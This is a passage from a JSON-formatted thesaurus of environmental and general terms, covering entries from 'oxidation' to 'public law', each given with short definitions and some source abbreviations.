where an element's positive valence is increased (electron loss), accompanied by a simultaneous reduction of an associated element (electron gain).\"], \"oxide\": [\"Binary chemical compound in which oxygen is combined with a metal or nonmetal.\"], \"oxygen\": [\"A gaseous chemical element with symbol O and atomic number 8; an essential element in cellular respiration and in combustion processes; the most abundant element in the earth's crust and about 20% of the air by volume.\\\\n(Source: MGH)\"], \"oxygenation\": [\"Treating with oxygen.\"], \"oxygen content\": [\"Amount of oxygen contained in a solution.\"], \"ozone\": [\"An allotropic form of oxygen containing three atoms in the molecule. It is a bluish gas, very active chemically, and a powerful oxidizing agent. Ozone is formed when oxygen or air is subjected to a silent electric discharge. It occurs in ordinary air in very small amounts only.\\\\n(Source: UVAROV)\"], \"ozone depletion potential\": [\"A factor that reflects the ozone depletion potential of a substance, on a mass per kilogram basis, as compared to chlorofluorocarbon-11 (CFC-11). Such factor shall be based upon the substance's atmospheric life time, the molecular weight of bromine and chlorine, and the substance's ability to be photolytically disassociated, and upon other factors determined to be an accurate measure of relative ozone depletion potential.\\\\n(Source: LEE)\"], \"ozone layer\": [\"The general stratum of the upper atmosphere in which there is an appreciable ozone concentration and in which ozone plays an important part in the radiative balance of the atmosphere.\"], \"packaging\": [\"All products made of any materials of any nature to be used for the containment, protection, handling, delivery and presentation of goods, from raw materials to processed goods, from the producer to the user or the consumer.\"], \"paint\": [\"A mixture of pigment and a vehicle, such as oil or water, that together form a liquid or paste that can be applied to a surface to provide an adherent coating that imparts colour, protects the surface and/or gives the surface different features.\", \"To make a painting.\", \"To make a painting of.\"], \"painting business\": [\"A commercial service through which paint, a decorative or protective coating product, or similar products are applied to the interiors and exteriors of buildings and other surfaces.\"], \"paint shop\": [\"A shop where paint and related items are sold.\"], \"paper\": [\"Felted or matted sheets of cellulose fibers, formed on a fine-wire screen from a dilute water suspension, and bonded together as the water is removed and the sheet is dried.\", \"Made of paper.\", \"A scholarly written work describing the results of observations or stating hypotheses.\"], \"parameter\": [\"1) A quantity in an equation which must be specified beside the independent variables to obtain the solution for the dependent variables. \\\\n2) A quantity which is constant under a given set of conditions, but may be different under other conditions.\\\\n(Source: LEE /  MGH)\"], \"parasite\": [\"Organism which lives and obtains food at the expense of another organism, the host.\", \"A person who exploits fellow human beings.\"], \"parasitology\": [\"A branch of biology which deals with those organisms, plant or animal, which have become dependent on other living creatures.\"], \"Parliament\": [\"An assembly of elected representatives, typically controlled by a political party and constituting the legislative and, in some cases, the executive power of a state.\"], \"participation\": [\"The act of sharing or taking part in a civic, community or public action.\"], \"particle\": [\"Any very small part of matter, such as a molecule, atom, or electron.\", \"One-syllable suffixes or short words in Japanese and Korean grammar that immediately follow the modified noun, verb, adjective, or sentence. They have a wide range of grammatical functions, including the indication of a question or the speaker's assertiveness, certitude, or other feelings.\", \"A word or term that lack a precise lexical definition, that is typically short, indeclinable, and have a grammatical function.\", \"A very small piece of matter.\"], \"particle separator\": [\"A device for segregation of solid particles by size range, as a screening.\"], \"passenger transport\": [\"The conveyance of people over land, water or through air by automobile, bus, train, airplane or some other means of travel.\"], \"pasture\": [\"Land covered with grass or herbage and grazed by or suitable for grazing by livestock.\", \"To put livestock into a field or pasture or meadow to graze.\", \"(For livestock) To feed on grass or herbage from a pasture.\", \"To feed as in a meadow or pasture.\"], \"pathogen\": [\"Any disease-producing agent or microorganism.\"], \"pathogenic organism\": [\"Agents producing or capable of producing disease.\"], \"pathology\": [\"The branch of medicine concerned with the causes, origin, and nature of disease, including the changes occurring as a result of disease.\"], \"peat\": [\"Unconsolidated soil material consisting largely of undecomposed or slightly decomposed organic matter accumulated under conditions of excessive moisture.\\\\n(Source: LANDY)\"], \"pedestrian zone\": [\"Area in a city where vehicles are not allowed.\"], \"pedosphere\": [\"That shell or layer of the Earth in which soil-forming processes occur.\"], \"penalty\": [\"Punitive sanction taken against someone who has broken the law.\", \"A free kick in football taken from 11 m in front of the goal with only the goalkeeper defending.\", \"A disadvantage imposed upon a competitor or team, according to the rules of the game.\", \"A legal punishment.\"], \"pentachlorophenol\": [\"A toxic phenolic compounds with formula C6HOCl5, used as a fungicide, herbicide and molluscicide.\"], \"perchloroethylene\": [\"Stable, colorless liquid, nonflammable and nonexplosive, with low toxicity; used as a dry-cleaning and industrial solvent, in pharmaceuticals and medicines, and for metal cleaning.\"], \"periphyton\": [\"A plant or animal organism which is attached or clings to surfaces of leaves or stems of rooted plants above the bottom stratum.\"], \"permeability\": [\"The ability of a membrane or other material to permit a substance to pass through it.\"], \"permissible exposure limit\": [\"An exposure limit that is set for exposure to an hazardous substance or harmful agent and enforced by OSHA (Occupational Safety and Health Act) as a legal standard. It is based on time-weighted average concentrations for a normal 8-hour work day and 40 hour work week.\"], \"permission\": [\"Voluntary agreement or permission.\"], \"peroxyacetylnitrate\": [\"A pollutant created by the action of sunlight on hydrocarbons and nitrogen oxides in the air. An ingredient of smog.\"], \"persistence\": [\"The capacity of a substance to remain chemically stable. This is an important factor in estimating the environmental effects of substances discharged into the environment. Certain toxic substances (e.g., cyanides) have a low persistence, whereas other less immediately toxic substances (e.g., many organochlorines) have a high persistence and may therefore produce more serious effects.\\\\n(Source: ALL)\", \"Lasting for a long period, being present for a long period.\"], \"persistence of pesticides\": [\"The ability of a chemical to retain its molecular integrity and hence its physical, chemical, and functional characteristics in the environment through which such a chemical may be transported and distributed for a considerable period of time.\\\\n(Source: GILP96)\"], \"pest\": [\"Any unwanted insect or other organism that attacks and damages crops, reduces the fertility of land or injures or irritates livestock or people.\", \"A persistently annoying person.\"], \"pest control\": [\"Keeping down the number of pests by killing them or preventing them from attacking.\"], \"pesticide\": [\"A general term for chemical agents that are used in order to kill unwanted plants, animals pests or disease-causing fungi.\"], \"residual pesticide\": [\"A pesticide remaining in the environment for a fairly long time, continuing to be effective for days, weeks, and months.\"], \"pest infestation\": [\"The occurrence of one or more pest species in an area or location where their numbers and impact are currently or potentially at intolerable levels.\", \"A sudden increase in destructiveness or population numbers of a pest species in a given area.\"], \"pet\": [\"An animal which is kept in the home as a companion and treated affectionately.\", \"To stroke or caress in an erotic manner, as during lovemaking.\"], \"petrochemical industry\": [\"The production of materials derived from petroleum or natural gas.\\\\n(Source: MGH)\"], \"petrol\": [\"A fuel for internal combustion engines consisting essentially of volatile flammable liquid hydrocarbons derived from crude petroleum.\"], \"petroleum\": [\"A comparatively volatile liquid bitumen composed principally of hydrocarbon, with traces of sulphur, nitrogen or oxygen compounds; can be removed from the earth in a liquid state.\"], \"petroleum consumption\": [\"Petroleum belongs to non-renewable energy sources; it is a complex substance derived from the carbonized remains of trees, ferns, mosses, and other types of vegetable matter. The principal chemical constituents of oil are carbon, hydrogen, and sulphur. The various fuels made from crude oil are jet fuel, gasoline, kerosine, diesel fuel, and heavy fuel oils. Major oil consumption is in the following areas: transportation, residential-commercial, industrial and for generating electric power.\\\\n(Source: PARCOR)\"], \"petroleum geology\": [\"The branch of economic geology that relates to the origin, migration and accumulation of oil and gas, and to the discovery of commercial deposits. Its practice involves the application of geochemistry, geophysics, paleontology, structural geology and stratigraphy to the problems of finding hydrocarbons.\\\\n(Source: BJGEO)\"], \"petroleum industry\": [\"Manufacturing industry utilizing complex combination of interdependent operations engaged in the storage and transportation, separation of crude molecular constituents, molecular cracking, molecular rebuilding, and solvent finishing to produce petrochemical products.\"], \"phanerogam\": [\"Plants that produce seeds. The group comprises the Gymnospermae and the Angiospermae.\\\\n(Source: ALL)\"], \"pharmaceutical industry\": [\"Concerted activity concerned with manufacturing pharmaceutical goods.\"], \"pharmacokinetics\": [\"The study of the rates of absorption, tissue distribution, biotransformation, and excretion.\\\\n(Source: LEE)\"], \"pharmacology\": [\"The science dealing with the nature and properties of drugs, particularly their actions.\\\\n(Source: MGH)\"], \"phenol\": [\"A white crystalline soluble poisonous acidic derivative of benzene, used as an antiseptic and disinfectant and in the manufacture of resins, nylon, dyes, explosives and pharmaceuticals.\\\\n(Source: CED)\"], \"pheromone\": [\"Any substance secreted by an animal which influences the behaviour of other individuals of the same species.\\\\n(Source: MGH)\"], \"philosophy\": [\"The academic discipline concerned with making explicit the nature and significance of ordinary and scientific beliefs and investigating the intelligibility of concepts by means of rational argument concerning their presuppositions, implications, and interrelationships; in particular, the rational investigation of the nature and structure of reality (metaphysics), the resources and limits of knowledge (epistemology), the principles and import of moral judgment (ethics), and the relationship between language and reality (semantics).\"], \"phosphate\": [\"Any salt or ester of any phosphoric acid, especially a salt of orthophosphoric acid.\"], \"phosphate removal\": [\"Replacement of phosphate in detergents by environmentally safer substances, such as zeolite. The substitute will not act as a nutrient, and so will not cause eutrophication as a result of the accelerated growth of plants and microorganisms if it is released into waterways.\\\\n(Source: WRIGHTa)\"], \"phosphate substitute\": [\"All substances that are able to substitute phosphate compounds in detergents; they must have the same chemical and physical properties and must be less polluting for the environment.\\\\n(Source: RRDA)\"], \"phosphorus\": [\"A nonmetallic element used to manufacture phosphoric acid, in phosphor bronzes, incendiaries, pyrotechnics, matches, and rat poisons; the white or yellow allotrope is a soft waxy solid, soluble in carbon disulfide, insoluble in water and alcohol, and is poisonous and self-igniting in air; the red allotrope is an amorphous powder, insoluble in all solvents and is nonpoisonous; the black allotrope comprises lustrous crystals similar to graphite, and is insoluble in most solvents.\"], \"photochemical effect\": [\"The result or consequence of a chemical reaction caused by light or ultraviolet radiation.\"], \"photochemical oxidant\": [\"Any of the chemicals which enter into oxidation reactions in the presence of light or other radiant energy.\"], \"photochemical product\": [\"Degradation products that are produced by the action of light radiation.\\\\n(Source: FLGISAa)\"], \"photochemical reaction\": [\"Chemical reaction which is initiated by light of a specific wavelength.\"], \"photochemical smog\": [\"A combination of fog and chemicals that come from automobile and factory emissions and is acted upon by the action of the sun.\"], \"photogrammetry\": [\"The process of making measurements from photographs, used especially in the construction of maps from aerial photographs and also in military intelligence, medical and industrial research, etc.\"], \"photograph\": [\"An image captured by a camera or some other device and reproduced as a picture, usually on a sensitized surface and formed by the chemical action of light or of radiant energy.\", \"To obtain an image of someone or something on photographic film or digital format by using photography.\"], \"photosynthesis\": [\"Process by which plants transform carbon dioxide and water into carbohydrates and other compounds, using energy from the sun captured by chlorophyll in the plant.\"], \"physical geography\": [\"The study of the spatial and temporal characteristics and relationships of all phenomena within the Earth's physical environment.\"], \"physical oceanography\": [\"The study of the physical aspects of the ocean, the movements of the sea, and the variability of these factors in relationship to the atmosphere and the ocean bottom.\\\\n(Source: MGH)\"], \"physical planning\": [\"A form of urban land use planning which attempts to achieve an optimal spatial coordination of different human activities for the enhancement of the quality of life.\\\\n(Source: LANDY)\"], \"physical process\": [\"A continuous action or series of changes which alters the material form of matter.\\\\n(Source: RHW)\"], \"physical property\": [\"Property of a substance that cannot change without involving a change in chemical composition.\", \"Physical quantity that is characteristic for a material or an object, e. g. density\"], \"physical science\": [\"The sciences concerned with nonliving matter, energy, and the physical properties of the universe, such as physics, chemistry, astronomy, and geology.\"], \"physics\": [\"The study of those aspects of nature which can be understood in a fundamental way in terms of elementary principles and laws.\"], \"physiology\": [\"The biological study of the functions of living organisms and their parts.\"], \"phytopathology\": [\"The study of plant diseases and their control.\\\\n(Source: ZINZAN)\"], \"phytoplankton\": [\"Planktonic plant life.\\\\n(Source: MGH)\"], \"phytosociology\": [\"The study of vegetation, including the organization, interdependence, development, geographical distribution and classification of plant communities.\"], \"phytotoxicity\": [\"Ability of a substance to cause injury or damage to a plant.\"], \"satellite image\": [\"A pictorial representation of data projected onto a two-dimensional grid of individual picture elements (pixels) and acquired from a human-made vessel placed in orbit round a planet, moon or star.\"], \"pilotage\": [\"The service provided by a pilot, one who controls the movements of a ship or aircraft by visual or electronic means.\"], \"pilot plant\": [\"A small version of a planned industrial plant, built to gain experience in operating the final plant.\"], \"pilot project\": [\"A small scale experiment or set of observations undertaken to decide how and whether to launch a full-scale project.\"], \"pinniped\": [\"A mammal belonging to the Pinnipedia, an order of aquatic placental mammals having a streamlined body and limbs specialized as flippers: includes seals, sea lions, and the walrus.\"], \"pipeline\": [\"A line of pipe connected to valves and other control devices, for conducting fluids, gases, or finely divided solids.\\\\n(Source: MGH)\", \"A system of tubes, especially the ones with a large diameter, for conducting ou distributing liquids or gases.\", \"To convey something by a system of pipes.\"], \"pipe\": [\"A rigid tube that transports water, steam or other fluid, as used in plumbing and numerous other applications.\", \"A device consisting of a mouthpiece, a long pipe stem and a pipe bowl, that is used to smoke tobacco.\"], \"plain\": [\"An extensive, broad tract of level or rolling, almost treeless land with a shrubby vegetation, usually at a low elevation.\", \"Having a surface without slope nor variations in altitude.\", \"To state complaints, discontent, displeasure, or unhappiness.\", \"Having only one color.\"], \"plan\": [\"A scheme of action, a method of proceeding, or a series of steps, thought out in advance to accomplish a goal.\", \"Scale drawing of a structure or its parts.\", \"To make or work out a plan for; devise.\", \"To have the intention to carry out some action.\", \"To make a (graphic) design of.\"], \"plankton\": [\"Small organisms (animals, plants, or microbes) passively floating in water.\"], \"planning\": [\"The act of making a detailed scheme for attaining an objective.\"], \"planning law\": [\"A binding rule or body of rules prescribed by a government to organize, designate and regulate land use.\"], \"planning permission\": [\"An authorization, license or equivalent control document issued by a government agency that approves a step by step method and process of defining, developing and outlining various possible courses of action to meet existing or future needs, goals and objectives.\\\\n(Source: TOE / ISEP)\"], \"plant breeding\": [\"Raising a certain type of plant by crossing one variety with another to produce a new variety where the desired characteristics are strongest.\"], \"plant community\": [\"Any group of plants belonging to a number of different species that co-occur in the same habitat or area and interact through trophic and spatial relationships; typically characterized by reference to one or more dominant species.\"], \"plant disease\": [\"A disease that affects plants.\"], \"plant genetics\": [\"The scientific study of the hereditary material of plants for purposes such as hybridization, improved food resources and increased production.\"], \"plant protection product\": [\"Any substance or mixture of substances which through physiological action protects the plants against parasites, fungi, virus, or other damaging factors.\\\\n(Source: KORENa)\"], \"plantigrade\": [\"Pertaining to mammals walking with the whole sole of the foot touching the ground.\", \"Mammal walking with the whole sole of the foot touching the ground.\"], \"planting\": [\"The establishment of trees or other plants by transplanting, or planting seedlings or cuttings.\"], \"plant physiology\": [\"The study of the function and chemical reactions within the various organs of plants.\\\\n(Source: UVAROV)\"], \"plant protection\": [\"Conservation of plant species that may be rare or endangered, and of other plants of particular significance.\\\\n(Source: GILP96)\"], \"plant trade\": [\"Trade of plants subjected to regulations established by the Convention on International Trade in Endangered Species (CITES).\"], \"plasma technology\": [\"1) Common name for a number of industrial applications of plasma, such as: etching of semiconductor chips, deposition of silicon for solar cell production, deposition of silicon dioxide for passivation of surfaces, activation of surfaces, melting and welding with plasma arcs as well as plasma chemistry. \\\\n2) Plasma technology consists of minute gas-filled cells, which emit light when an electric current is channelled through them.\\\\n(Source: IEAP /  Z2Z)\"], \"plastic\": [\"A polymeric material (usually organic) of large molecular weight which can be shaped by flow; usually refers to the final product with fillers, plasticizers, pigments, and stabilizers included (versus the resin, the homogeneous polymeric starting material); examples are polyvinyl chloride, polyethylene, and urea-formaldehyde.\", \"Capable of being molded or modeled.\"], \"plastic waste\": [\"Any discarded plastic (organic, or synthetic, material derived from polymers, resins or cellulose) generated by any industrial process, or by consumers.\\\\n(Source: APD)\"], \"platinum\": [\"A ductile malleable silvery-white metallic element very resistant to heat and chemicals. It occurs free and in association with other platinum metals, especially in osmiridium; used in jewellery, laboratory apparatus, electrical contacts, dentistry, electroplating, and as a catalyst.\"], \"playground\": [\"A piece of land used for recreation, especially by children, often including equipment such as swings and slides.\"], \"plutonium\": [\"A highly toxic metallic transuranic element with symbol Pu and atomic number 94.\"], \"poaching\": [\"The action of catching game, fish, etc. illegally by trespassing on private property.\\\\n(Source: CED)\"], \"point source\": [\"A single identifiable localized source of something.\"], \"poison\": [\"A substance which, when ingested, inhaled, or absorbed, or when applied to, injected into, or developed within the body, in relatively small amounts, may cause injury, harm, or destruction to organs, tissue, or life.\", \"To administer a toxic substance.\"], \"poisoning\": [\"The morbid condition produced by a poison which may be swallowed, inhaled, injected, or absorbed through the skin.\\\\n(Source: KOREN)\"], \"polar ecosystem\": [\"The interacting systems of the biological communities and their nonliving environmental surroundings located in the regions where the air temperature is perennially below 10\\u00b0 Celsius, usually at and near the North and South Poles.\", \"Ecosystem of the region around Earth's poles.\"], \"polar region\": [\"Area relating to the earth's poles or the area inside the Arctic or Antarctic Circles.\"], \"polder\": [\"A generally fertile tract of flat, low-lying land (as in Netherlands and Belgium) reclaimed and protected from the sea, a lake, a river, or other body of water by the use of embankments, dikes, dams, or levees.\"], \"police\": [\"Branch of the government which is charged with the preservation of public order, the promotion of public health and safety, and the prevention, detection, and punishment of crimes.\"], \"police law\": [\"A binding rule or body of rules prescribed by a government to regulate the employment and tactics of police or other civil agents organized to maintain order, prevent and detect crimes and promote obedience to civil regulations and authority.\"], \"policy\": [\"A general plan of action, formulated by a political party, a government agency or a similar institution.\"], \"politics\": [\"The theory and practice of acquiring and exercising the power to govern in a society in order to arbitrate values, allocate resources and establish and enforce rules.\"], \"policy planning\": [\"The process of making arrangements or preparations to facilitate any course of action that may be adopted and pursued by government, business or some other organization.\"], \"political doctrine\": [\"A policy, position or principle advocated, taught or put into effect concerning the acquisition and exercise of the power to govern or administrate in society.\\\\n(Source: RHW)\"], \"political ecology\": [\"The study of how political, economic, and social factors affect environmental issues.\"], \"political geography\": [\"The study of the effects of political actions on human geography, involving the spatial analysis of political phenomena.\\\\n(Source: GOOD)\"], \"political party\": [\"An organized group that has as its fundamental aim the attainment of political power and public office for its designated leaders. Usually, a\\\\npolitical party will advertise a common commitment by its leaders and its membership to a set of political, social, economic and/or cultural values.\"], \"political power\": [\"The might, ability or authority of governments, citizens groups and other interested parties in enacting change or in influencing or controlling the outcome of governmental or public policies affecting a nation, region or municipality.\\\\n(Source: BLD)\"], \"pollen\": [\"A fine granular substance produced in flowers. Collective term for pollen grains or microspores produced in the anthers of flowering plants.\"], \"pollutant\": [\"A substance, usually a residue of human activity, which has an undesirable effect upon the environment.\", \"A substance that pollutes.\"], \"pollutant accumulation\": [\"The process by which concentrations of pollutants progressively increase in the tissues of living organisms in environments where these pollutants are present.\"], \"pollutant emission\": [\"Release of polluting substances in the air, water and soil from a given source and measured at the immission point.\"], \"pollutant load\": [\"The amount of polluting material that a transporting agent, such as a stream, a glacier, or the wind, is actually carrying at a given time.\"], \"polluter-pays principle\": [\"The principle that those causing pollution should meet the costs to which it gives rise.\"], \"pollution\": [\"The indirect or direct alteration of the biological, thermal, physical, or radioactive properties of any medium in such a way as to create a hazard or potential hazard to human health or to the health, safety or welfare of any living species.\\\\n(Source: ALL)\"], \"pollution load\": [\"The amount of polluting material that a transporting agent, such as a stream, a glacier, or the wind, is actually carrying at a given time.\"], \"pollution measurement\": [\"The assessment of the concentration of pollutants for a given time in a given point.\"], \"polybrominated biphenyl\": [\"A chemical substance consisting of several bromine atoms attached to biphenyl.\"], \"polychlorinated biphenyl\": [\"Any of a class of aromatic organic compounds formed by the chlorination of the hydrocarbon biphenyl; they have many industrial applications but are damaging to the environment.\"], \"polychlordibenzo-p-dioxin\": [\"PCDD are formed (along with variants including furans) when compounds containing chlorine are burnt at low temperature in improperly operated/designed domestic refuse and industrial waste incinerators where PCDDs can be found in both the flue gases and the fly ash.\\\\n(Source: PORT)\"], \"polychlorinated dibenzofuran\": [\"A family containing 135 individual, colorless compounds known as congeners with varying harmful health and environmental effects. They are produced as unwanted compounds during the manufacture of several chemicals and consumer products such as wood treatment chemicals, some metals, and paper products; also produced from the burning of municipal and industrial waste in incinerators, from exhaust of leaded gasoline, heat, or production of electricity. They are hazardous to the respiratory system, gastrointestinal system, liver, musculoskeletal system, skin and nervous system; and are toxic by inhalation, ingestion, and contact. Symptoms of exposure include frequent coughing, severe respiratory infections, chronic bronchitis, abdominal pain, muscle pain, acne rashes, skin color changes, unexpected weight loss, nonmalignant or malignant liver disease.\\\\n(Source: KOREN)\"], \"polychlorinated terphenyl\": [\"Compounds consisting of three benzene rings linked to each other in either ortho, meta or para positions and substituted with chlorine atoms.\"], \"polycyclic aromatic hydrocarbon\": [\"Hydrocarbons containing two or more closed rings of atoms.\"], \"polycyclic hydrocarbon\": [\"Hydrocarbon molecule with two or more nuclei; examples are naphtalene, with two benzene rings side by side, or diphenyl, with two bond-connected benzene rings. Also known as polynuclear hydrocarbon.\\\\n(Source: MGH)\"], \"polyethylene terephtalate\": [\"A thermoplastic polyester resin made from ethylene glycol and terephthalic acid; melts at 265\\u00b0C; used to make films or fibers.\"], \"polymer\": [\"Substance made of giant molecules formed by the union of simple molecules (monomers).\\\\n(Source: MGH)\"], \"polyvinyl chloride\": [\"Polymer of vinyl chloride; tasteless, odourless; insoluble in most organic solvents; a member of the family of vinyl resins.\"], \"pond\": [\"A natural body of standing fresh water occupying a small surface depression, usually smaller than a lake and larger than a pool.\"], \"tailings pond\": [\"Any collection of liquid effluents or wastewater drained or separated out during the processing of crops or mineral ores.\"], \"pool\": [\"A small, natural body of standing water, usually fresh; e.g. a stagnant body of water in a marsh, or a still body of water within a cave.\"], \"population distribution\": [\"The density, dispersal pattern and apportionment of the total number of persons in any area.\\\\n(Source: RHW / EEN)\"], \"population dynamics\": [\"The process of numerical and structural change within populations resulting from births, deaths, and movements.\"], \"population ecology\": [\"The study of the interaction of a particular species or genus population with its environment.\"], \"population growth\": [\"An increase in the total number of inhabitants of a country, city, district or area.\"], \"population movement\": [\"Any shift or migration of a statistically significant number of persons inhabiting a country, district or area.\\\\n(Source: RHW)\"], \"population structure\": [\"The organization of, and inter-relationships among, inhabitants of a given region, country or city.\"], \"population trend\": [\"The direction of change in the total number of persons inhabiting a country, city, district or area.\"], \"potash\": [\"Any of several compounds containing potassium, especially soluble compounds such as potassium oxide, potassium chloride, and various potassium sulfates, used chiefly in fertilizers.\"], \"rock salt mining\": [\"Rock salt mining is an underground mining process in which the salt is physically dug out of the ground in an operation involving drilling, blasting and crushing the rock. The major percentage of this output is used for winter road maintenance.\\\\n(Source: SALINF)\"], \"poultry\": [\"Domesticated fowl grown for their meat and eggs.\", \"A bird that is kept for its meat and eggs.\"], \"poverty\": [\"State in which the individual lacks the resources necessary for subsistence.\", \"Lack of the means of subsistence.\"], \"power station\": [\"A stationary plant containing apparatus for large-scale conversion of some form of energy (such as hydraulic, steam, chemical, or nuclear energy) into electrical energy.\", \"A stationary plant containing apparatus for large-scale conversion of some form of energy (such as hydraulic, steam, chemical, or nuclear energy) into electrical energy.\"], \"precipitation enhancement\": [\"Increase of precipitation resulting from changes in the colloidal stability of clouds. This can be either intentional, as with cloud seeding, or unintentional, as with air pollution, which increases aerosol concentrations and reduces sunlight.\\\\n(Source: PARCOR)\"], \"predator\": [\"Animal which kills and eats other animals.\\\\n(Source: PHC)\", \"Man who is hostile to, feels hatred towards, opposes the interests of, or intends injury to someone else.\"], \"prefabricated building\": [\"Building whose sections are manufactured in specialized factories and later transported and assembled on a building site.\"], \"preliminary proceedings\": [\"Any introductory action in the judicial process designed to determine the need for further court involvement or to expedite a motion that requires immediate attention.\\\\n(Source: BLD)\"], \"premium\": [\"Amount to be paid for a contract of insurance or life assurance.\"], \"preservative\": [\"A chemical added to foodstuffs to prevent oxidation, fermentation or other deterioration, usually by inhibiting the growth of bacteria.\"], \"preserve\": [\"A sweet spread made of any of a variety of berries.\", \"To keep something or someone safe or prevent harm coming to someone or something.\", \"To protect; to keep; to maintain the condition of.\"], \"press\": [\"Printed matter as a whole, especially newspapers and periodicals.\", \"A crowd of people pressed close together in a small space.\", \"To apply pressure to an item.\", \"To force or impel in a given direction.\"], \"pressing\": [\"Needing urgent attention.\"], \"pressure\": [\"A type of stress which is exerted uniformly in all directions; its measure is the force exerted per unit area.\", \"To exert violence, or constraint upon or against a person in order to obtain something by physical, moral or intellectual means.\"], \"pressure group\": [\"Any politically active group with a common set of values about resource use allocation.\"], \"price\": [\"The amount of money paid per unit for a good or service.\", \"To attach a price tag to goods or services which are to be sold.\", \"To fix or set a price to be paid for, or asked for, a good or service which one wants to sell.\"], \"primary education\": [\"The first five or six years of instruction in elementary schools.\\\\n(Source: COE)\"], \"primary energy consumption\": [\"Consumption of energy used in the same form as in its naturally occurring state, for example crude oil, coal, natural gas, e.g. before it is converted into electricity.\\\\n(Source: BRACK)\"], \"primary sector\": [\"That part of a country's or region's economy that makes direct use of natural resources, including agriculture, forestry, fishing and the fuel, metal and mining industries.\"], \"primate\": [\"Order of mammals containing monkeys, apes, and human beings.\", \"In the Western Catholic Church and in the Anglican Communion, a bishop with higher rank than a metropolitan archbishop but, in the Catholic Church, with less high rank than a major archbishop.\"], \"primary forest\": [\"Forest which originally covered a region before changes in the environment brought about by people.\"], \"printing industry\": [\"A sector of the economy in which an aggregate of commercial enterprises is engaged in the reproduction of written text or images in multiple copies such as books, periodicals, newspapers or other similar formats.\\\\n(Source: SIC)\"], \"printing work\": [\"The art, process or business of producing reproductions of written text or images in multiple copies, in book, periodical or newspaper formats, or in other similar formats.\\\\n(Source: SIC / RHW)\"], \"private household\": [\"Living quarters where a group of persons (family) live together.\\\\n(Source: GOOD)\"], \"private law\": [\"The branch of law dealing with such aspects of relationships between individuals that are of no direct concern to the state.\"], \"private sector\": [\"Segment of the economy not run by government, including households, sole traders, partnerships and companies.\"], \"private transport\": [\"Transport performed with private means.\"], \"proboscidean\": [\"An order of herbivorous placental mammals characterized by having a proboscis, incisors enlarged to become tusks, and pillarlike legs with five toes bound together on a broad pad.\"], \"procaryote\": [\"Organisms (i.e. prokaryotes) whose genetic material (filaments of DNA) is not enclosed by a nuclear membrane, and that do not possess mitochondria or plastids. Bacteria and cyanophyta are the only prokaryotic organisms.\"], \"procedural law\": [\"Law which prescribes method of enforcing rights or obtaining redress for their invasion. Laws which fix duties, establish rights and responsibilities among and for persons, natural or otherwise, are \\\"substantive laws\\\" in character, while those which merely prescribe the manner in which such rights and responsibilities may be exercised and enforced in a court are \\\"procedural laws\\\".\\\\n(Source: BLACK)\"], \"processing\": [\"The act of converting material from one form into another desired form.\"], \"process water\": [\"Water used in a manufacturing or treatment process or in the actual product manufactured.\"], \"producer liability\": [\"Obligations, responsibilities or debts imposed upon all members of an industry that manufactures or produces a product or service causing injury or harm to a consumer and apportioned according to each member's share of the market for the product.\\\\n(Source: BLD)\"], \"product\": [\"Something produced by human or mechanical effort or by a natural process.\", \"A chemical substance formed as a result of a chemical reaction.\", \"A commodity offered for sale.\", \"A quantity obtained by multiplication of two or more numbers.\"], \"product information\": [\"Factual, circumstantial and, often, comparative knowledge concerning various goods, services or events, their quality and the entities producing them.\"], \"productivity\": [\"The amount of output or yield per unit of input or expenditure achieved by a company, industry or country.\"], \"productivity trend\": [\"The general direction or tendency in the measurement of the production of goods and services having exchange value.\"], \"product liability\": [\"The legal liability of manufacturers and sellers to compensate buyers, users, and even bystanders, for damages or injuries suffered because of defects in goods purchased.\"], \"product standard\": [\"A standard which prescribes aspects of the physical or chemical composition of products which have potential for causing environmental damage or the handling, presentation and packaging of products, particularly those which are toxic.\\\\n(Source: GRAHAW)\"], \"profit\": [\"An excess of the receipts over the spending, costs and expenses of a business or other commercial entity during any period.\", \"What it remains after subtracting from the total of the revenues the total of the costs of an economic activity or a commercial or financial operation.\", \"Income following the deduction of all expenses, taxes, and the like.\", \"The advantageous quality of being beneficial.\", \"To derive a benefit from.\"], \"programme\": [\"A scheme of action, a method of proceeding, or a series of steps, thought out in advance to accomplish a goal.\", \"To enter a program or other instructions into a computer (or other electronic device) to instruct it to do a particular task.\", \"To arrange the schedule of an event.\"], \"prohibition\": [\"An interdiction or forbidding of an activity or action by authority or law.\"], \"project\": [\"To make or work out a plan for; devise.\", \"To extend out or project in space.\", \"To show on a screen.\", \"To communicate vividly (e.g. feelings).\"], \"propellant\": [\"A gas used in aerosol preparations to expel the liquid contents through an atomizer.\"], \"prosecution\": [\"The pursuit of legal proceedings, particularly criminal proceedings.\"], \"prosperity\": [\"State of being prosperous; wealth or success.\"], \"water protection area\": [\"Area surrounding a water recovery plant in which certain forms of soil utilization are restricted or prohibited in order to protect the groundwater.\\\\n(Source: AZENP)\"], \"protection of species\": [\"Measures adopted for the safeguarding of species, of their ecosystems and their biodiversity.\\\\n(Source: ADMIN)\"], \"protection system\": [\"A series of procedures and devices designed to preserve people, property or the environment from injury or harm.\\\\n(Source: RHW)\"], \"protein\": [\"Any of a class of high-molecular weight polymer compounds composed of a variety of alfa-amino acids joined by peptide linkages.\"], \"protocol\": [\"The original draft of a document.\", \"An international agreement of a less formal nature than a treaty. It is often used to amend treaties. (Source: DICLAW)\", \"A formal description of digital message formats and the rules for exchanging those messages in or between computing systems and in telecommunications.\"], \"protozoan\": [\"A diverse phylum of eukaryotic microorganisms; the structure varies from a simple uninucleate protoplast to colonial forms, the body is either naked or covered by a test, locomotion is by means of pseudopodia or cilia or flagella, there is a tendency toward universal symmetry in floating species and radial symmetry in sessile types, and nutrition may be phagotrophic or autotrophic or saprozoic.\"], \"province\": [\"A geographic area of some considerable extent, smaller than a continent but larger than a region, which is unified by some or all of its characteristics and which can therefore be studied as a whole. A faunal province, for example, has a particular assemblage of animal species, which differs from assemblages in different contemporaneous environments elsewhere.\\\\n(Source: WHIT)\", \"An administrative subdivision of a country, in some cases relatively autonomous and equivalent to a state, in others, smaller and less autonomous and more akin to a county.\"], \"psychology\": [\"The science that deals with the functions of the mind and the behaviour of an organism in relation to its environment.\\\\n(Source: MGH)\"], \"psychosomatic illness\": [\"Illness arising from or aggravated by a mind-body relationship.\"], \"public action\": [\"A measure or provision taken on behalf and with the consent of the general populace.\"], \"public bath\": [\"A place having baths for public use.\"], \"public building\": [\"A building to which there is free access by the public and which is available for the use of a community.\"], \"public health\": [\"The discipline in health science that, at the level of the community or the public, aims at promoting prevention of disease, sanitary living, laws, practices and a healthier environment.\\\\n(Source: GUNN)\"], \"public law\": [\"The branch of law which governs relationships between individuals and the government.\"], \"public 